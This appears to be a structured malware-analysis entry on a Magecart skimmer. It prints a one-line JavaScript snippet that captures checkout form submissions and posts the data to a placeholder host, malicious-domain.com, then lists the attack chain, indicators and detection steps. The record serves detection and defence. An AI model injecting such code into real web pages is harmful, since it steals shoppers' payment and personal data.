package_info.why_malicious: The Magecart skimmer is malicious because it is injected into e-commerce websites to steal customers’ personal and financial information by intercepting and exfiltrating payment data during checkout.

execution_context.file_location: Injected JavaScript in checkout/payment page HTML

malicious_snippets.code_snippet: document.querySelector('form').addEventListener('submit', function(e) { var data = new FormData(this); fetch('https://malicious-domain.com/collect', { method: 'POST', body: data }); });
malicious_snippets.code_behavior: At runtime, the code intercepts form submission, collects all form data (including payment details), and sends it to a hardcoded external domain via HTTPS POST, resulting in credential and payment data exfiltration.

malice_analysis.why_suspicious: Intercepting and exfiltrating sensitive payment data to an external domain is a classic sign of a skimmer attack.
malice_analysis.violated_expectations: Normal e-commerce JavaScript should not send payment form data to unknown third-party domains.
malice_analysis.similar_legitimate_use: Form data may be sent to payment processors, but only to trusted, whitelisted domains.
key_indicators: Event listener on payment form submission
Exfiltration of form data to untrusted external domain
Use of fetch/XHR to send sensitive data

attack_chain.action: Attacker injects malicious JavaScript into the checkout page of the e-commerce site.
attack_chain.leads_to: Malicious code executes in customer browsers during checkout.

attack_chain.action: Malicious JavaScript intercepts payment form submission and exfiltrates data to attacker-controlled server.
attack_chain.leads_to: Attacker receives stolen payment and personal data.

behavioral_signatures: JavaScript intercepting form submissions on payment pages
Outbound network requests to untrusted or newly registered domains from checkout pages
Unexpected fetch/XHR calls containing payment or PII data
file_indicators: Injected or obfuscated JavaScript in checkout or payment page HTML
References to external scripts from non-whitelisted domains
network_indicators: HTTPS POST requests from checkout pages to domains not associated with the merchant
Unusual traffic patterns to domains known for skimming activity
detection_knowledge.how_to_detect: Monitor e-commerce checkout pages for injected or unauthorized JavaScript, especially code that intercepts form submissions and sends data to external domains. Use network monitoring to detect outbound requests containing payment or PII data to untrusted destinations. Regularly scan site code for changes and compare against known-good baselines.
